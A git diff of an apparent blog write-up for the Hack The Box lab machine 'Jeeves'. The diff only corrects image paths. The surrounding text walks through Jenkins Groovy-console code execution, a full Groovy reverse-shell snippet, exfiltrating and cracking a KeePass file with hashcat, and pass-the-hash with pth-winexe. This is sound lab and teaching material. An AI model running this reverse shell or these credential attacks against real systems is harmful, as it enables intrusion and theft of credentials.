@@ -13,22 +13,22 @@ tags:
 
 Jeeves is in reference to a Jenkins server that we will eventually be exploiting. Super fun recap box!
 
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/imagesJeeves/jeevessite1.PNG)
+![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/Jeeves/jeevessite1.PNG)
 Starting off by scanning ports.
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/imagesJeeves/jeevesscan.PNG)
+![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/Jeeves/jeevesscan.PNG)
 
 See there is at least one webserver. Fuzz directories, ran nikto etc. Nothing of real interest there.
 Check out the second Jetty webserver spotted in the nmap scan. gobuster until we find askjeeves	
 
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/imagesJeeves/jeeves1finsihsed.PNG)
+![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/Jeeves/jeeves1finsihsed.PNG)
 
 Stumble accross the scripting console
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/imagesJeeves/jeevescli.PNG)
+![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/Jeeves/jeevescli.PNG)
 
 Do research to find ways to exploit this
 exploit jenkins with groovy script 
 https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/imagesJeeves/jeevesscript.PNG)
+![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/Jeeves/jeevesscript.PNG)
 
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy
@@ -38,14 +38,14 @@ int port=1234;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/imagesJeeves/jeevesusershell.PNG)  
+![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/Jeeves/jeevesusershell.PNG)  
   
 We get a user shell as kohsuke. 
 After a little bit of recon we come accross CEH.kdbx 
   
 This file format appears to be a keepass password file. Before we attempt to see the password we have to download the file to our local machine. 
   
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/imagesJeeves/jeeveskdbx.PNG)
+![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/Jeeves/jeeveskdbx.PNG)
 
  I achieved this by downloading a netcat executable from the user shell we are in from a python http server that we host.
   
@@ -66,9 +66,9 @@ use hashcat to crack the file.
 ./hashcat -m 13400 -a 0 -w 1 CEH.hash <wordlist-file> 
  moonshine1 is the password to the keepass file
   
- ![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/imagesJeeves/jeeveskeepass1.png)
+ ![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/Jeeves/jeeveskeepass1.png)
  
- ![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/imagesJeeves/jeeveskeepass2.png)
+ ![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/Jeeves/jeeveskeepass2.png)
  
  We find a hash in the keepass file under the title of Backup stuff
  From here I got stuck for a while. While researching I found the tool pth-winexe
@@ -77,10 +77,10 @@ use hashcat to crack the file.
  pth-winexe --user=jeeves/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 --system //10.10.10.63 cmd.ex
  
  we now have a root shell!
- ![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/imagesJeeves/jeevesroot.PNG)
+ ![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/Jeeves/jeevesroot.PNG)
 
 admin has hm.txt file redirecting to actual file
-![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/imagesJeeves/jeeveshn.PNG)
+![](https://github.com/MaangoTaachyon/tkyn.dev/tree/main/assets/images/Jeeves/jeeveshn.PNG)
 
  get-content .\hm.txt -stream root.txt
 and we get root flag :)
